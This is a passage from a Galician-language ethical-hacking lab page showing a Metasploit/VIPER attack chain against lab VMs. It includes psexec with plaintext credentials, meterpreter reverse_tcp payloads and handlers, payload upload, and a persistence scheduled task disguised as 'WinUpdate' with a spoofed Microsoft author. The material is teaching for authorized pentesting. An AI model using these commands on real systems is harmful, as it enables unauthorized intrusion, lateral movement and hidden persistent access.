+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>sessions<span class="w"> </span>-i<span class="w"> </span>&lt;ID_da_sesión_de_VM-3&gt;
+</span></code></pre></div>
+Tamén por interface gráfica de VIPER:
+<center><img alt="reverse_tcp 4444 sessions" src="../images/viper-msfconsole-444_4.png" width="50%" /></center></p>
+<p><img alt="Fig. 16: Movemento lateral - psexec" src="../images/psexec-movemento-lateral-2.png" />
+<img alt="Fig. 17: Movemento lateral - psexec" src="../images/psexec-movemento-lateral-3.png" />
+<img alt="Fig. 18: Movemento lateral - psexec" src="../images/psexec-movemento-lateral-4.png" /></p>
+<hr />
+<h2 id="exemplo-3">Exemplo 3: Persistencia</h2>
+<div class="admonition warning">
+<p class="admonition-title">Prerrequisito</p>
+<p>Antes de comezar, realiza o <a href="#exemplo-1"><strong>Exemplo 1: Reverse Shell</strong></a> e o <a href="#exemplo-2"><strong>Exemplo 2: Movemento Lateral</strong></a>.</p>
+</div>
+<blockquote>
+<p>Concepto e diagrama en <a href="../../apuntamentos/viper/#tecnica-persistencia" target="_blank">Persistencia</a>.</p>
+</blockquote>
+<p><img alt="viper - Exemplo3" src="../../apuntamentos/images/viper-exemplo3.png" /></p>
+<p>Estableceremos persistencia en Windows 11 tras obter unha sesión <code>meterpreter</code> con <code>psexec</code>, mediante unha <strong>tarefa programada</strong> que reconecta tras reinicios.</p>
+<h5 id="paso-1-acceder-a-vitima-con-psexec">Paso 1: Acceder á vítima con <code>psexec</code></h5>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>use<span class="w"> </span>exploit/windows/smb/psexec
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="nb">set</span><span class="w"> </span>RHOSTS<span class="w"> </span><span class="m">192</span>.168.120.102
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="nb">set</span><span class="w"> </span>SMBUser<span class="w"> </span>usuario
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="nb">set</span><span class="w"> </span>SMBPass<span class="w"> </span>abc123.
+</span><span id="__span-12-5"><a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_tcp
+</span><span id="__span-12-6"><a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.120.100
+</span><span id="__span-12-7"><a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">5555</span>
+</span><span id="__span-12-8"><a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>run
+</span></code></pre></div>
+<img alt="Fig. psexec" src="../images/persistencia1.png" /></p>
+<h5 id="paso-2-poner-a-sesion-en-background">Paso 2: Poñer a sesión en background</h5>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>meterpreter<span class="w"> </span>&gt;<span class="w"> </span>background
+</span></code></pre></div>
+<img alt="Fig. background" src="../images/persistencia2.png" /></p>
+<h5 id="paso-3-iniciar-un-multihandler-para-a-persistencia-lapela-msfconsole">Paso 3: Iniciar un <code>multi/handler</code> para a persistencia (lapela Msfconsole)</h5>
+<p><div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>use<span class="w"> </span>exploit/multi/handler
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="nb">set</span><span class="w"> </span>PAYLOAD<span class="w"> </span>windows/meterpreter/reverse_tcp
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="nb">set</span><span class="w"> </span>LHOST<span class="w"> </span><span class="m">192</span>.168.120.100
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a><span class="nb">set</span><span class="w"> </span>LPORT<span class="w"> </span><span class="m">6666</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a><span class="nb">set</span><span class="w"> </span>ExitOnSession<span class="w"> </span><span class="nb">false</span>
+</span><span id="__span-14-6"><a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>run
+</span></code></pre></div>
+<img alt="Fig. multi/handler" src="../images/persistencia3.png" /></p>
+<h5 id="paso-4-xerar-o-payload-para-persistencia">Paso 4: Xerar o payload para persistencia</h5>
+<p>No Dashboard → <code>Handler&amp;Payload</code> → <code>Generate Payload</code>: selecciona o handler, formato <code>exe</code> para Windows, e descarga.</p>
+<p><img alt="Fig. Generate Payload" src="../images/payload0_0.png" />
+<img alt="Fig. Generate Payload" src="../images/payload0_1.png" width="30%" />
+<img alt="Fig. Generate Payload" src="../images/payload0_2.png" width="50%" /></p>
+<h5 id="paso-5-subir-o-payload-a-vm-3-e-crear-a-tarefa-programada">Paso 5: Subir o payload a VM-3 e crear a tarefa programada</h5>
+<p>Copiar no contedor docker de viper o payload en <code>/tmp</code>:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="c1"># docker cp /home/usuario/Descargas/1744925454.exe viper-c:/tmp</span>
+</span></code></pre></div>
+Abrir na GUI unha consola dende a conexión establecida no porto 5555:<br />
+<img alt="Fig. Paso 5" src="../images/payload0_3.png" /></p>
+<p>Subir o ficheiro ao Windows vítima:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>meterpreter&gt;<span class="w"> </span>upload<span class="w"> </span>/tmp/1744925454.exe<span class="w"> </span>C:<span class="se">\\</span>Users<span class="se">\\</span>usuario<span class="se">\\</span>
+</span></code></pre></div>
+<img alt="Fig. Paso 5" src="../images/payload0_4.png" /></p>
+<p>Obter o SID do usuario (para o <code>task.xml</code>):
+<div class="language-text highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>execute -f cmd.exe -a &#39;/c wmic useraccount where name=&quot;usuario&quot; get sid &gt; C:\Windows\Temp\sidinfo.txt&#39;
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>cat C:\\Windows\\Temp\\sidinfo.txt
+</span></code></pre></div>
+Crear <code>task.xml</code> (execútase con batería permitida):
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-16&quot;?&gt;</span>
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="s1">&lt;Task version=&quot;1.2&quot; xmlns=&quot;http://schemas.microsoft.com/windows/2004/02/mit/task&quot;&gt;</span>
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a><span class="s1">  &lt;RegistrationInfo&gt;</span>
+</span><span id="__span-18-4"><a id="__codelineno-18-4" name="__codelineno-18-4" href="#__codelineno-18-4"></a><span class="s1">    &lt;Description&gt;Execución persistente con batería permitida&lt;/Description&gt;</span>
+</span><span id="__span-18-5"><a id="__codelineno-18-5" name="__codelineno-18-5" href="#__codelineno-18-5"></a><span class="s1">    &lt;Author&gt;Microsoft Corporation&lt;/Author&gt;</span>
+</span><span id="__span-18-6"><a id="__codelineno-18-6" name="__codelineno-18-6" href="#__codelineno-18-6"></a><span class="s1">  &lt;/RegistrationInfo&gt;</span>
+</span><span id="__span-18-7"><a id="__codelineno-18-7" name="__codelineno-18-7" href="#__codelineno-18-7"></a><span class="s1">  &lt;Triggers&gt;</span>
+</span><span id="__span-18-8"><a id="__codelineno-18-8" name="__codelineno-18-8" href="#__codelineno-18-8"></a><span class="s1">    &lt;LogonTrigger&gt;</span>
+</span><span id="__span-18-9"><a id="__codelineno-18-9" name="__codelineno-18-9" href="#__codelineno-18-9"></a><span class="s1">      &lt;Enabled&gt;true&lt;/Enabled&gt;</span>
+</span><span id="__span-18-10"><a id="__codelineno-18-10" name="__codelineno-18-10" href="#__codelineno-18-10"></a><span class="s1">    &lt;/LogonTrigger&gt;</span>
+</span><span id="__span-18-11"><a id="__codelineno-18-11" name="__codelineno-18-11" href="#__codelineno-18-11"></a><span class="s1">  &lt;/Triggers&gt;</span>
+</span><span id="__span-18-12"><a id="__codelineno-18-12" name="__codelineno-18-12" href="#__codelineno-18-12"></a><span class="s1">  &lt;Principals&gt;</span>
+</span><span id="__span-18-13"><a id="__codelineno-18-13" name="__codelineno-18-13" href="#__codelineno-18-13"></a><span class="s1">    &lt;Principal id=&quot;Author&quot;&gt;</span>
+</span><span id="__span-18-14"><a id="__codelineno-18-14" name="__codelineno-18-14" href="#__codelineno-18-14"></a><span class="s1">      &lt;UserId&gt;S-1-5-21-2901123646-3497879057-3457833120-1001&lt;/UserId&gt;</span>
+</span><span id="__span-18-15"><a id="__codelineno-18-15" name="__codelineno-18-15" href="#__codelineno-18-15"></a><span class="s1">      &lt;LogonType&gt;InteractiveToken&lt;/LogonType&gt;</span>
+</span><span id="__span-18-16"><a id="__codelineno-18-16" name="__codelineno-18-16" href="#__codelineno-18-16"></a><span class="s1">      &lt;RunLevel&gt;HighestAvailable&lt;/RunLevel&gt;</span>
+</span><span id="__span-18-17"><a id="__codelineno-18-17" name="__codelineno-18-17" href="#__codelineno-18-17"></a><span class="s1">    &lt;/Principal&gt;</span>
+</span><span id="__span-18-18"><a id="__codelineno-18-18" name="__codelineno-18-18" href="#__codelineno-18-18"></a><span class="s1">  &lt;/Principals&gt;</span>
+</span><span id="__span-18-19"><a id="__codelineno-18-19" name="__codelineno-18-19" href="#__codelineno-18-19"></a><span class="s1">  &lt;Settings&gt;</span>
+</span><span id="__span-18-20"><a id="__codelineno-18-20" name="__codelineno-18-20" href="#__codelineno-18-20"></a><span class="s1">    &lt;DisallowStartIfOnBatteries&gt;false&lt;/DisallowStartIfOnBatteries&gt;</span>
+</span><span id="__span-18-21"><a id="__codelineno-18-21" name="__codelineno-18-21" href="#__codelineno-18-21"></a><span class="s1">    &lt;StopIfGoingOnBatteries&gt;false&lt;/StopIfGoingOnBatteries&gt;</span>
+</span><span id="__span-18-22"><a id="__codelineno-18-22" name="__codelineno-18-22" href="#__codelineno-18-22"></a><span class="s1">    &lt;AllowStartOnDemand&gt;true&lt;/AllowStartOnDemand&gt;</span>
+</span><span id="__span-18-23"><a id="__codelineno-18-23" name="__codelineno-18-23" href="#__codelineno-18-23"></a><span class="s1">    &lt;StartWhenAvailable&gt;true&lt;/StartWhenAvailable&gt;</span>
+</span><span id="__span-18-24"><a id="__codelineno-18-24" name="__codelineno-18-24" href="#__codelineno-18-24"></a><span class="s1">    &lt;Enabled&gt;true&lt;/Enabled&gt;</span>
+</span><span id="__span-18-25"><a id="__codelineno-18-25" name="__codelineno-18-25" href="#__codelineno-18-25"></a><span class="s1">    &lt;Hidden&gt;false&lt;/Hidden&gt;</span>
+</span><span id="__span-18-26"><a id="__codelineno-18-26" name="__codelineno-18-26" href="#__codelineno-18-26"></a><span class="s1">  &lt;/Settings&gt;</span>
+</span><span id="__span-18-27"><a id="__codelineno-18-27" name="__codelineno-18-27" href="#__codelineno-18-27"></a><span class="s1">  &lt;Actions Context=&quot;Author&quot;&gt;</span>
+</span><span id="__span-18-28"><a id="__codelineno-18-28" name="__codelineno-18-28" href="#__codelineno-18-28"></a><span class="s1">    &lt;Exec&gt;</span>
+</span><span id="__span-18-29"><a id="__codelineno-18-29" name="__codelineno-18-29" href="#__codelineno-18-29"></a><span class="s1">      &lt;Command&gt;C:\Windows\Temp\shell.exe&lt;/Command&gt;</span>
+</span><span id="__span-18-30"><a id="__codelineno-18-30" name="__codelineno-18-30" href="#__codelineno-18-30"></a><span class="s1">    &lt;/Exec&gt;</span>
+</span><span id="__span-18-31"><a id="__codelineno-18-31" name="__codelineno-18-31" href="#__codelineno-18-31"></a><span class="s1">  &lt;/Actions&gt;</span>
+</span><span id="__span-18-32"><a id="__codelineno-18-32" name="__codelineno-18-32" href="#__codelineno-18-32"></a><span class="s1">&lt;/Task&gt;&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>/home/usuario/Descargas/task.xml
+</span></code></pre></div>
+Copiar ao contedor e subir a VM-3:
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="c1"># docker cp /home/usuario/Descargas/task.xml viper-c:/tmp</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a>meterpreter&gt;<span class="w"> </span>upload<span class="w"> </span>/tmp/task.xml<span class="w"> </span>C:<span class="se">\\</span>Users<span class="se">\\</span>usuario<span class="se">\\</span>
+</span></code></pre></div>
+<img alt="Fig. Paso 5" src="../images/payload0_5.png" /></p>
+<p>Crear a tarefa programada a partir do ficheiro:
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>execute -f powershell.exe -a &quot;-Command schtasks /create /tn &#39;WinUpdate&#39; /xml C:\Users\usuario\task.xml&quot;
+</span></code></pre></div>
+<img alt="Fig. Paso 6" src="../images/execute1.png" />
+<img alt="Fig. Paso 6" src="../images/execute2.png" /></p>
+<p>A tarefa executarase ao login, con privilexios elevados, mesmo con batería, e chamará ao payload.</p>
+<h5 id="paso-6-probar-ou-agardar-reconexion">Paso 6: Probar ou agardar reconexión</h5>
+<p><div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>execute -f powershell.exe -a &quot;-Command schtasks /run /tn &#39;WinUpdate&#39;&quot;
+</span></code></pre></div>
+<img alt="Fig. Paso 6" src="../images/execute3.png" />
+<img alt="Fig. Paso 6" src="../images/execute4.png" /></p>
+<p>Ou reiniciar (a sesión chega ao handler tras o login):
+<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>shutdown /r /t 0
+</span></code></pre></div>
+<img alt="Fig. Paso 6" src="../images/execute5.png" />
+<img alt="Fig. Paso 6" src="../images/payload0_6.png" /></p>
+<hr />
+<h2 id="resumo">Resumo</h2>
+<ol>
+<li><code>VM-2</code> (Debian) comprometida cun payload (<code>Meterpreter</code>) — <strong>acceso inicial</strong>.</li>
+<li><strong>Movemento lateral</strong> dende <code>VM-2</code> cara <code>VM-3</code> sen pivoting, con credenciais válidas (<code>usuario/abc123.</code>).</li>
+<li>Acceso a <code>VM-3</code> mediante <code>psexec</code>.</li>
+<li><strong>Persistencia</strong> mediante payload + tarefa programada.</li>
+</ol>
+<div class="admonition tip">
+<p class="admonition-title">Movemento Lateral e Pivoting</p>
+<ul>
+<li><strong>Movemento lateral:</strong> estenderse dun equipo comprometido a outros da rede para ampliar o acceso (aquí, <code>psexec</code> sobre SMB).</li>
+<li><strong>Pivoting:</strong> usar un equipo comprometido como relé (proxy ou túnel) para chegar a redes/segmentos non accesibles directamente.</li>
+</ul>
+<p>Non son opostos: o pivoting habilita o movemento lateral cara a redes illadas. Nesta práctica a VM-2 ve a VM-3 na mesma subrede, así que se fai <strong>movemento lateral sen pivoting</strong>. (Detalle en <a href="../../apuntamentos/viper/#tecnica-movemento-lateral" target="_blank">Movemento lateral vs. Pivoting</a>.)</p>
+</div>
+<h2 id="conclusion">Conclusión</h2>
+<p>Esta práctica ofrece un procedemento detallado para <strong>simular ataques comúns</strong> (<strong>Reverse Shell</strong>, <strong>Movemento Lateral</strong>, <strong>Persistencia</strong>) con VIPER, reproducindo a cadea de ataque dun Red Team. O obxectivo é dominar as técnicas ofensivas do <strong>pentesting (Hacking Ético)</strong>: entender como pensa e actúa un atacante real para poder identificar e explotar as vulnerabilidades dun sistema de forma controlada e autorizada.</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Volver ao principio
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../..", "features": ["content.code.copy", "content.code.select", "content.code.annotate", "navigation.tabs", "navigation.tabs.sticky", "navigation.top"], "search": "../../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copiado no cortapapeis", "clipboard.copy": "Copiar no cortapapeis", "search.result.more.one": "1 m\u00e1is nesta p\u00e1xina", "search.result.more.other": "# m\u00e1is nesta p\u00e1xina", "search.result.none": "Sen resultados", "search.result.one": "1 resultado atopado", "search.result.other": "# resultados atopados", "search.result.placeholder": "Insira un termo", "search.result.term.missing": "Falta", "select.version": "Seleccionar version"}, "version": null}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.d7400e89.min.js"></script>
+      
+        <script src="../../../js/medium-zoom.min.js"></script>
+      
+        <script src="../../../js/opera.js"></script>
+      
+        <script src="../../../js/zoom.js"></script>
+      
+    
+  </body>
+</html>
